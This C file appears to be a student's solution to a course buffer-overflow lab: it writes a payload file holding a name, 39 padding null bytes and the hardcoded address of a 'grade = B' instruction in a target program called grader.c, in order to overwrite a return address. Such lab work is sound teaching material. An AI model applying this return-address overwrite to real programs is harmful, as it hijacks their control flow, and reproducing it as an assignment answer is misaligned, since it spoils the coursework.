/**********************************************************************/
/* Author: Chimwemwe Chinkuyu                                         */
/* file: createdataB.c                                                      */
/**********************************************************************/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>


/* Takes in no input and writes "Chimwemwe", by 39 null bytes,
 * and then the address of the instruction [grade = 'B'] in grader.c 
 * to file dataB. Returns 0.*/
int main(void) {
    FILE *psFile;
    unsigned long ulAddress;
    int i = 0;

    /* Open file dataB to write data into */
    psFile = fopen("dataB", "w");

    /* Write my name (Chimwemwe) to the file dataB */
    fprintf(psFile, "Chimwemwe");

    /* Write 39 null bytes to dataB (one terminating the name string */ 
    /* and 38 to fill up the remaining cells in the buf[] array) */
    for (; i < 39; i++) {
        /* Write the null bytes as binary data */ 
        putc(0x00, psFile);
    }

    /* Write the unsigned long address (0x400858) of the [grade = 'B']
     * instruction in grader.c to file dataB */
    ulAddress = 0x400858;
    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);

    /* Close the file */
    fclose(psFile);

    return 0;
}
